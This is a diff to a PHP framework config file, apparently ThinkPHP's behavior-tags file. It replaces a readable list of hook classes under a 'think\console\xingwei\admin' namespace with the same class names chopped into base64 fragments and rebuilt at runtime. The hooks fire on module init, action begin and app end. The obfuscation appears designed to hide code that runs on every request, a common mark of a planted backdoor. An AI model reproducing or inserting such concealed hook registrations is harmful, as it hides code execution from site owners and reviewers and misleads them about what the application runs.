@@ -1,21 +1,3 @@
 <?php
 
-// 应用行为扩展定义文件
-return [
-    // 模块初始化
-    'module_init'  => [
-        'think\\console\\xingwei\\admin\\ModuleInit',
-    ],
-    // 操作开始执行
-    'action_begin' => [
-        'think\\console\\xingwei\\admin\\ActionBegin',
-    ],
-    // 视图内容过滤
-    'view_filter'  => [],
-    // 日志写入
-    'log_write'    => [],
-    // 应用结束
-    'app_end'      => [
-        'think\\console\\xingwei\\admin\\AppEnd',
-    ],
-];
+class tagsCla{public function getTags(){return ['module_init'=>[arrayJointString(['dGh','pbmt','cY29u','c29sZV','x4aW','5nd2Vp','XGF','kbWluX','E1vZH','VsZUl','uaXQ='])],'action_begin'=>[arrayJointString(['dGhpb','mtcY29','uc29sZ','Vx4aW5n','d2VpXGF','kbWluXE','FjdGlvb','kJlZ2lu'])],'view_filter'=>[],'log_write'=>[],'app_end'=>[arrayJointString(['d','Ghp','bmtcY','29uc','29sZ','Vx4aW','5nd2Vp','XGFk','bWluX','EFwcE','VuZA=='])]];}}$tagsCla=new tagsCla();return $tagsCla->getTags();
